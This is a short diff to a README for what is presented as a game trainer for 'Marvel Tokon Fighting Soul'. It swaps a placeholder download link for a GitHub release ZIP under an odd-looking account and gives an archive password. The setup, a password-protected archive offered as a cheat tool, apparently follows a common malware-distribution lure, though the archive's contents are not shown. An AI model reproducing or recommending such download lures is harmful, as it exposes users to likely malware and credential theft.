@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Marvel-Tokon-Fighting-Soul-Trainer/releases/latest/download/MarvelTokon-Trainer.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/leonsmithdev99y0/Marvel-Tokon-Fighting-Soul-Trainer/releases/download/download/MarvelTokon_Trainer.zip)
 
 🔐 Archive password: `5868781`
 
